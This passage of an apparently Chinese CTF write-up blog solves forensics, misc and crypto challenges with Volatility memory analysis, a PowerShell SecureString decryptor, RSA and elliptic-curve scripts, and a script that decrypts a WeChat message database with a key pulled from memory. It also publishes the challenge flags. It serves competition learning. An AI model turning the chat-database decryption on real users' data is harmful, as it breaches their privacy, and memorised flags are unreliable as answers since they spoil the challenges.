class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"></span><br><span class="line">SS_DEFAULT_HEADER = <span class="string">&#x27;76492d1116743f0423413b16050a5345&#x27;</span></span><br><span class="line">SS_DEFAULT_ENCODING = <span class="string">&#x27;utf_16_le&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_from_secure_string</span>(<span class="params">key,</span></span><br><span class="line"><span class="params">                               data,</span></span><br><span class="line"><span class="params">                               header=SS_DEFAULT_HEADER,</span></span><br><span class="line"><span class="params">                               enc=SS_DEFAULT_ENCODING,</span></span><br><span class="line"><span class="params">                               iv=<span class="literal">None</span></span>):</span><br><span class="line">    key_str = <span class="built_in">str</span>(<span class="built_in">bytearray</span>(key))</span><br><span class="line">    padlen = <span class="number">16</span> - (<span class="built_in">len</span>(data) % <span class="number">16</span>)</span><br><span class="line">    data += <span class="built_in">chr</span>(padlen) * padlen</span><br><span class="line">    <span class="keyword">if</span> iv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        iv = Random.new().read(AES.block_size)</span><br><span class="line">    iv_str = <span class="built_in">str</span>(<span class="built_in">bytearray</span>(iv))</span><br><span class="line">    cipher = AES.new(key_str, AES.MODE_CBC, iv_str)</span><br><span class="line">    ciphertext = cipher.encrypt(data)</span><br><span class="line">    rest_raw = <span class="string">&#x27;2|&#123;0&#125;|&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(iv_str),</span><br><span class="line">                                  ciphertext.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> enc:</span><br><span class="line">        rest_raw = rest_raw.encode(enc)</span><br><span class="line">    rest_b64 = base64.b64encode(rest_raw)</span><br><span class="line">    output = header + rest_b64</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_secure_string</span>(<span class="params">key,</span></span><br><span class="line"><span class="params">                             data,</span></span><br><span class="line"><span class="params">                             header=SS_DEFAULT_HEADER,</span></span><br><span class="line"><span class="params">                             enc=SS_DEFAULT_ENCODING</span>):</span><br><span class="line">    key_str = <span class="built_in">str</span>(<span class="built_in">bytearray</span>(key))</span><br><span class="line">    <span class="built_in">print</span>(key_str)</span><br><span class="line">    key_str = <span class="string">&#x27;F844A6035CF27CC4C90DFEAF&#x27;</span></span><br><span class="line">    data = data[<span class="built_in">len</span>(header):]</span><br><span class="line">    p = base64.b64decode(data)</span><br><span class="line">    <span class="keyword">if</span> enc:</span><br><span class="line">        p = p.decode(enc)</span><br><span class="line">    p = p.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(p) != <span class="number">3</span> <span class="keyword">or</span> p[<span class="number">0</span>] != <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    iv_str = base64.b64decode(p[<span class="number">1</span>])</span><br><span class="line">    ciphertext = p[<span class="number">2</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    cipher = AES.new(key_str, AES.MODE_CBC, iv_str)</span><br><span class="line">    d = cipher.decrypt(ciphertext)</span><br><span class="line">    d = (d[:-<span class="built_in">ord</span>(d[<span class="built_in">len</span>(d) - <span class="number">1</span>:])])</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># key = [</span></span><br><span class="line">    <span class="comment">#     3, 4, 2, 3, 56, 34, 254, 222, 205, 34, 2, 23, 42, 64, 33, 223, 1, 34,</span></span><br><span class="line">    <span class="comment">#     2, 7, 6, 5, 35, 12</span></span><br><span class="line">    <span class="comment"># ]</span></span><br><span class="line">    key = <span class="string">&#x27;xx&#x27;</span></span><br><span class="line">    msg = <span class="string">&#x27;76492d1116743f0423413b16050a5345MgB8AFQAegB3AFAAaAArAFcAVABwAEYAWABLAGoAUwBaAEsAQQBvAHAAagBrAFEAPQA9AHwAOABmADIAOQBmADkANgA4ADkAMABlADIAZgBmADgAMwA0AGEAYwAxADIAMgA5ADYAZgAyADMAMQBiAGEANAA2ADUAOQAxADEANgAyADUANwA2AGEAMgBkAGYANQBjAGQAYwA5ADQAMgAyAGMANgBiADIAYwA5ADEANgA3ADkAZgA1AGUAMgA5ADYANQAyADEAOAA1ADMAYwAyADcAZABhADAAZgA2AGQAOQA0AGEAOAA2ADEAMQA4ADIAZgBhADgAMwBjAGYAMwBmAGEAMQAwADYANQBmADIANwA0AGYANgAxADIAZAA5ADYANgBjAGQANQBkADAAOQA4AGEAMgAwADYAYQA5ADgAMgBkADkANABlAGEANABmADEAMAA0ADEAMQA4ADcAOABlADcAYQBmADQAMQBiADQAMgBmADEANwA=&#x27;</span></span><br><span class="line">    out = convert_to_secure_string(key, msg,<span class="string">&#x27;76492d1116743f0423413b16050a5345&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"><span class="comment">#flag&#123;Y0u_Are_thE_Master_0f_powershell&#125;</span></span><br></pre></td></tr></table></figure><h4 id="easy-Forensic"><a href="#easy-Forensic" class="headerlink" title="easy_Forensic"></a>easy_Forensic</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">小明不小心把自己出题的flag在微信中发了出去，你能找到这个flag吗？</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><p>桌面上发现：\Device\HarddiskVolume1\Users\Admin\Desktop\gift.jpg直接dump下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f  secret.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d80a7d0 -D ./ -u  </span><br></pre></td></tr></table></figure><p>修改高度之后得到压缩包密码：Nothing_is_more_important_than_your_life!</p><p>wHeMscYvTluyRvjf5d7AEX5K4VlZeU2IiGpKLFzek1Q=</p><p>base64解密转成16进制保存：</p><p>c0778cb1c62f4e5bb246f8dfe5dec0117e4ae15959794d88886a4a2c5cde9354</p><p>然后把桌面上的wechat.txt dump出来保存保存为old.dat</p><p>然后结合文章<a href="https://mp.weixin.qq.com/s/4DbXOS5jDjJzM2PN0Mp2JA">https://mp.weixin.qq.com/s/4DbXOS5jDjJzM2PN0Mp2JA</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES</span><br><span class="line">import hashlib, hmac, ctypes, sys, getopt</span><br><span class="line"></span><br><span class="line">SQLITE_FILE_HEADER = bytes(&#x27;SQLite format 3&#x27;, encoding=&#x27;ASCII&#x27;) + bytes(1)</span><br><span class="line">IV_SIZE = 16</span><br><span class="line">HMAC_SHA1_SIZE = 20</span><br><span class="line">KEY_SIZE = 32</span><br><span class="line">DEFAULT_PAGESIZE = 4096</span><br><span class="line">DEFAULT_ITER = 64000</span><br><span class="line">opts, args = getopt.getopt(sys.argv[1:], &#x27;hk:d:&#x27;)</span><br><span class="line">input_pass = &#x27;&#x27;</span><br><span class="line">input_dir = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for op, value in opts:</span><br><span class="line">    if op == &#x27;-k&#x27;:</span><br><span class="line">        input_pass = value</span><br><span class="line">    else:</span><br><span class="line">        if op == &#x27;-d&#x27;:</span><br><span class="line">            input_dir = value</span><br><span class="line"></span><br><span class="line">password = bytes.fromhex(input_pass.replace(&#x27; &#x27;, &#x27;&#x27;))</span><br><span class="line"></span><br><span class="line">with open(input_dir, &#x27;rb&#x27;) as (f):</span><br><span class="line">    blist = f.read()</span><br><span class="line">print(len(blist))</span><br><span class="line">salt = blist[:16]</span><br><span class="line">key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, password, salt, DEFAULT_ITER, KEY_SIZE)</span><br><span class="line">first = blist[16:DEFAULT_PAGESIZE]</span><br><span class="line">mac_salt = bytes([x ^ 58 for x in salt])</span><br><span class="line">mac_key = hashlib.pbkdf2_hmac(&#x27;sha1&#x27;, key, mac_salt, 2, KEY_SIZE)</span><br><span class="line">hash_mac = hmac.new(mac_key, digestmod=&#x27;sha1&#x27;)</span><br><span class="line">hash_mac.update(first[:-32])</span><br><span class="line">hash_mac.update(bytes(ctypes.c_int(1)))</span><br><span class="line"></span><br><span class="line">if hash_mac.digest() == first[-32:-12]:</span><br><span class="line">    print(&#x27;Decryption Success&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;Password Error&#x27;)</span><br><span class="line">blist = [blist[i:i + DEFAULT_PAGESIZE] for i in range(DEFAULT_PAGESIZE, len(blist), DEFAULT_PAGESIZE)]</span><br><span class="line"></span><br><span class="line">with open(input_dir, &#x27;wb&#x27;) as (f):</span><br><span class="line">    f.write(SQLITE_FILE_HEADER)</span><br><span class="line">    t = AES.new(key, AES.MODE_CBC, first[-48:-32])</span><br><span class="line">    f.write(t.decrypt(first[:-48]))</span><br><span class="line">    f.write(first[-48:])</span><br><span class="line">    for i in blist:</span><br><span class="line">        t = AES.new(key, AES.MODE_CBC, i[-48:-32])</span><br><span class="line">        f.write(t.decrypt(i[:-48]))</span><br><span class="line">        f.write(i[-48:])</span><br></pre></td></tr></table></figure><p>上面的脚本保存为dec.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dec.py -k c0778cb1c62f4e5bb246f8dfe5dec0117e4ae15959794d88886a4a2c5cde9354 -d old.dat</span><br></pre></td></tr></table></figure><p>然后strings old.dat|grep flag </p><p>klllflag{The_Is_Y0ur_prize}</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="strange-curve"><a href="#strange-curve" class="headerlink" title="strange curve"></a>strange curve</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There are many ways to represent an elliptic curve,do you know them?</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><p>直接分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="number">56006392793427940134514899557008545913996191831278248640996846111183757392968770895731003245209281149</span>))</span><br><span class="line"><span class="string">b&#x27;flag&#123;b7f209df-1284-4bdf-b030-28197483c47b&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="point-power"><a href="#point-power" class="headerlink" title="point-power"></a>point-power</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you know Powerpoint?How about point-power?</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">G=2G，根据椭圆曲线的计算公式构造出式子：(x2+2x1)4(x13+ax1+b)=(3x12+a)**2直接解a</span><br><span class="line">可以使用https://sagecell.sagemath.org/执行sage</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">p = 3660057339895840489386133099442699911046732928957592389841707990239494988668972633881890332850396642253648817739844121432749159024098337289268574006090698602263783482687565322890623</span><br><span class="line">b = 1515231655397326550194746635613443276271228200149130229724363232017068662367771757907474495021697632810542820366098372870766155947779533427141016826904160784021630942035315049381147</span><br><span class="line">x1 = 2157670468952062330453195482606118809236127827872293893648601570707609637499023981195730090033076249237356704253400517059411180554022652893726903447990650895219926989469443306189740</span><br><span class="line">x2 = 1991876990606943816638852425122739062927245775025232944491452039354255349384430261036766896859410449488871048192397922549895939187691682643754284061389348874990018070631239671589727</span><br><span class="line">P.&lt;a&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = (x2+2*x1)*4*(x1**3+a*x1+b)-(3*x1**2+a)**2</span><br><span class="line">f=f.monic()</span><br><span class="line">a = f.roots()</span><br><span class="line">print(a)</span><br><span class="line">#[(918875439627055594259552478508551728381826199399685938622511660790511287097297184191298481453657480331998130281110691444641445094194011219176724349745237973925436007792522611119050, 1), (56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325, 1)]</span><br><span class="line">print(long_to_bytes(56006392793430010663016642098239513811260175999551893260401436587175373756825079518464264729364083325))</span><br><span class="line">#b&#x27;flag&#123;fa76cfb1-0052-4416-914d-91517bcebd52&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="鹏城杯"><a href="#鹏城杯" class="headerlink" title="鹏城杯"></a>鹏城杯</h2><p><a href="/image/media/2022/ctf/2022.08/%E9%B9%8F%E5%9F%8E%E6%9D%AF.zip">2022鹏城杯</a></p><h3 id="misc-4"><a href="#misc-4" class="headerlink" title="misc"></a>misc</h3><h4 id="简单取证"><a href="#简单取证" class="headerlink" title="简单取证"></a>简单取证</h4><p><a href="/image/media/2022/ctf/2022.08/%E7%AE%80%E5%8D%95%E5%8F%96%E8%AF%81.zip">简单取证.zip</a></p><ul><li>思路</li></ul><p>取证题目，volatility使用imageinfo查看镜像信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f  file.raw imageinfo</span><br></pre></td></tr></table></figure><p>扫描全盘文件，筛选桌面上的东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f  file.raw --profile=WinXPSP2x86 filescan</span><br><span class="line">volatility  -f  file.raw --profile=WinXPSP2x86 filescan |grep 桌面</span><br></pre></td></tr></table></figure><p>得到结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">0x0000000002072ea0      1      1 RW-rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\51763-4FE71AEA7-20220620-130010.raw</span><br><span class="line">0x00000000020dd608      1      0 R--r-d \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\DumpIt.exe</span><br><span class="line">0x0000000002162df8      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面</span><br><span class="line">0x000000000224e028      1      1 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面</span><br><span class="line">0x0000000002325028      1      0 R--r-- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\secret.jpg</span><br><span class="line">0x00000000023ac178      1      1 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面</span><br><span class="line">0x00000000023d5960      1      0 R--rw- \Device\HarddiskVolume1\Documents and Settings\Administrator\桌面\DumpIt.exe</span><br><span class="line">0x000000000240d8d8      3      1 R--rwd \Device\HarddiskVolume1\Documents and Settings\All Users\桌面</span><br></pre></td></tr></table></figure><p>dump 出来桌面上的secret.jpg，执行完命令之后会看到会多出一个dat文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f  file.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000002325028 --dump-dir=./</span><br></pre></td></tr></table></figure><p>然后查看是base64编码看到最后有个KP，知道需要base64解密+翻转，然后得到一个带密码的压缩包，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">## base64解密转文件，并在中间反转一次</span><br><span class="line">import  base64</span><br><span class="line">with open(&quot;beginfile&quot;,&quot;r&quot;,encoding=&quot;Utf8&quot;) as file:</span><br><span class="line">    data = base64.b64decode(file.read())</span><br><span class="line">    file = open(&#x27;flag.zip&#x27;, &#x27;wb&#x27;)</span><br><span class="line">    file.write(data[::-1])</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure><p>然后再cmd中找到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility  -f  file.raw --profile=WinXPSP2x86 cmdscan</span><br></pre></td></tr></table></figure><p>找到Cmd #0 @ 0x35baa90: echo password = 62b041223bb9a所以压缩包密码就是62b041223bb9a</p><p>得到一个类似坐标之类的TXT文件，在kali下使用gnuplot进入终端然后输入gnuplot&gt; plot 前面保存的TXT文件位置，得到一个二维码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a6b93e36-f097-11ec-a9b2-5254002d2b31&#125;</span><br></pre></td></tr></table></figure><h4 id="babybit"><a href="#babybit" class="headerlink" title="babybit"></a>babybit</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加密的起止时间会被存储在注册表中，于是将注册表进行备份然后准备分析一下，可是不小心误删了备份文件，你可以帮小明恢复出删除的文件并找到bitlocker加密的开始和结束时间么？ flag格式为PCL&#123;YYYY/MM/DD_HH:MM:SS_YYYY/MM/DD_HH:MM:SS&#125;，前面是开始时间，后面是结束时间。</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><p>首先使用FTK Imager进行镜像挂载</p><p>file —&gt;   imgae mounting —&gt; 选择imag file —&gt; 点击Mount之后会看到多出来一块磁盘</p><p>（上述操作可能会涉及到一个读写权限：将mouunt method的权限换成Block device/Writable）</p><p>然后使用DiskGenius64做磁盘分析，选择刚刚新增的磁盘分区进行分析找到路径下</p><p>新增磁盘下的:$RECYCLE.BIN\S-1-5-21-76198463-1691821667-776024894-1001下有一个zip</p><p>然后导入Registry Explorer参考<a href="https://twitter.com/0gtweet/status/1418322629996564480">https://twitter.com/0gtweet/status/1418322629996564480</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Undocumented, never described #DFIR artifact containing the timestamp of BitLocker encryption. Easy to interpret with one-liner: ([datetime]::FromFileTime((Get-ItemProperty (&quot;HKLM:\SYSTEM\CurrentControlSet\Control\FVEStats\&quot;)).&#x27;OsvEncryptInit&#x27;))</span><br><span class="line">With horrible ACL though...</span><br><span class="line"></span><br><span class="line">未记录、从未描述#DFIR包含BitLocker加密时间戳的工件。易于用一行: ( [datetime ]:: FromFileTime (( Get-ItemProperty (&quot;HKLM:\SYSTEM\CurrentControlSet\Control\FVEStats\ &quot;)). &#x27;OsvEncryptInit&#x27; ))</span><br><span class="line">虽然有可怕的 ACL ...</span><br></pre></td></tr></table></figure><p>找到<code>\SYSTEM\CurrentControlSet\Control\FVEStats\</code>下的时间戳</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell转一下时间</span><br><span class="line">[<span class="built_in">datetime</span>]::FromFileTimeUTC(<span class="string">&quot;132995786261823536&quot;</span>)</span><br><span class="line"><span class="number">2022</span>年<span class="number">6</span>月<span class="number">13</span>日 <span class="number">7</span>:<span class="number">23</span>:<span class="number">46</span></span><br><span class="line">[<span class="built_in">datetime</span>]::FromFileTimeUTC(<span class="string">&quot;132995782594427750&quot;</span>)</span><br><span class="line"><span class="number">2022</span>年<span class="number">6</span>月<span class="number">13</span>日 <span class="number">7</span>:<span class="number">17</span>:<span class="number">39</span></span><br></pre></td></tr></table></figure><p>得到UTC+0时间，和flag格式PCL{YYYY/MM/DD_HH:MM:SS_YYYY/MM/DD_HH:MM:SS}</p><p>PCL{2022/06/13_07:17:39_2022/06/13_07:23:46}提交不对</p><p>考虑到时区所以要加8h，然后多试了几次发现要把06的0去掉得到flag</p><p>PCL{2022/6/13_15:17:39_2022/6/13_15:23:46}</p><h4 id="Misc-water"><a href="#Misc-water" class="headerlink" title="Misc_water"></a>Misc_water</h4><ul><li>思路</li></ul><p>binwalk拿到一个图</p><p>在原图中发现jpg文件后缀，找到文件头逆序，然后水印</p><p>java -jar BlindWatermark-v0.0.3-windows-x86_64.jar decode -f 提取出来的jpg 水印之后保存的图片 </p><p>拿到zip密码：ZC4#QaWbW</p><p>得到一个马赛克，010查看是png文件，修改后缀名</p><p>爆破宽高733和698修改后得到：</p><p>PCL{f0b31d6f9abc59f34815678c31d79178}</p><h4 id="what-is-log"><a href="#what-is-log" class="headerlink" title="what_is_log"></a>what_is_log</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某机器的mysql中存在一些秘密，通过log文件你能找到它输入的密码或者这个秘密吗(添加PCL格式提交)</span><br></pre></td></tr></table></figure><ul><li>思路</li></ul><p>在kali中使用sysdig -r flag2.scap evt.type=write |grep success</p><p>得到flag：PCL{1555a651a13ec074ce725383214fd7cc}</p><h2 id="领航杯"><a href="#领航杯" class="headerlink" title="领航杯"></a>领航杯</h2><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><h4 id="factor2"><a href="#factor2" class="headerlink" title="factor2"></a>factor2</h4><ul><li>思路</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">n = 14142010206099386143235977555692857399310494373372334255226213043954222671886219214790080363755519983589419573494262932031062165425660149023699589427423291076757673539031113758789961660789969074666728548356143546954548237178966812807683542026090314756465049840269239582841323515153189937744280883895942616355068450477244038093783025761830910527817275117470273068582606801561816182028771714266926279491448124072638544823523354972471012076902504991756879694948477398253632905720027515230565063830199860044535605314432273647912553716877788661706091962626029470938285869557993283863813783012548154763397158585969860496209</span><br><span class="line">e1 = 8044170206501208651566242545498471362911890649958881015968520025930186294576023443506808099677296038797758573489705294289102108150592764180571398770862282775413964383616485564171756065468610971753771700993772575426420613330938626182989999507422559869431997096499661057456703567386749182728255894961711</span><br><span class="line">c1 = 11517322714245526592044873592382373283428914348422645739336159016405003731268657488015847458779166523731678788259036486197351408324218938844963108776390284845014868126098529982171539875948326597563481747612010865265679909207769244324752454968172401384300433252342047155447253514663020084257315172025978213587941036806257025876560069777775117798912056950800470305039358493009376541529192357082470617915062674822440632959240104574498373020678875137349967659371746447815516349204225897744273956308472359601558104152900628002351072193856499370256139818744736463310402972428459727204523498170929275318085749369313370330104</span><br><span class="line">e2 = 7981110843177277522743262582712207767500318326009118362192817529414323700650435360291001887232564132664914694220334201133850645107707193720930288877874115700468049318771691746592219604611120450612600603061311788240065247605723819417162805390035814213048743243801428908542140081097421519822132590047533</span><br><span class="line">c2 = 12907231513900923422005862146378905589636791955213455533815625546155661275692081099543894853443339737652933422555561840945917851059973294781475696342510739464313686827430856742266071924616860913810640580296234473777303348248031669837803543965896443694327322478656672147536068477193332582821244877632320706358476947499828283809012293724747791713411303065091158644428874828519807586496004634361827049528190857803358038226873772036022804215684911051370929474550764142943510840488678370689581686370179457811111602201500802245275266633124851078915997894235280935026230159846619929979668248511374747926732890795947582868735</span><br><span class="line">e3 = 8321945773137532897701269832287423438330975369722946793416731752574708023263908693097168458920645511451157398450278461406044452962800707032660103849647429968263806321843635237930345258217128805872313308435747131438472827261934005675575066641207582827978944766548998867180054428477087525524476746729443</span><br><span class="line">c3 = 14065425026445215199826296511184881258323064633386950509660192854866326626040354040592178906620984652169865998063876885421774133239148395916412178848784041317916589243316140373118461629430419305769180856968279675982734449182890302977853892881391084830333333875116598959777525928574769839174695101654696531535920235825780434207646161363349309470260223615977113109458426965856166705879375711518022880712089324008258280991081209228374850515248942548172463741894540420262751207821783524890116559086561517224038086473047623408064157594299815732082781632190258405091440187576055868450259807171733509904666142689629066721239</span><br><span class="line">y1,x1,x2=gcdext(e1,e2)</span><br><span class="line">s,t1,x3=gcdext(y1,e3)</span><br><span class="line">print(s)</span><br><span class="line">m=pow(c1,x1*t1,n)*pow(c2,x2*t1,n)*pow(c3,x3,n)%n</span><br><span class="line">print(bytes.fromhex(hex(m)[2:]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="misc-5"><a href="#misc-5" class="headerlink" title="misc"></a>misc</h3><h4 id="隐秘的角落"><a href="#隐秘的角落" class="headerlink" title="隐秘的角落"></a>隐秘的角落</h4><ul><li>思路</li></ul><p>拿到一个word，看起来都是正常的，给了一堆假的flag，用zip打开在，word–&gt;header3.xml中发现了flag</p><h4 id="神秘的压缩包"><a href="#神秘的压缩包" class="headerlink" title="神秘的压缩包"></a>神秘的压缩包</h4><ul><li>思路</li></ul><p>循环解压脚本需要修改</p><h5 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import zstandard</span><br><span class="line">import pathlib</span><br><span class="line">import gzip</span><br><span class="line">import bz2</span><br><span class="line">import lzma</span><br><span class="line">import py7zr</span><br><span class="line"></span><br><span class="line">count = 1</span><br><span class="line">extra_outputfile = &quot;compress/flag&quot; + str(count)</span><br><span class="line">outputfile = &quot;compress/flag&quot; + str(count + 1)</span><br><span class="line"></span><br><span class="line">def decompress_lzma_to_folder(input_file):</span><br><span class="line">    with open(outputfile, &#x27;wb&#x27;) as 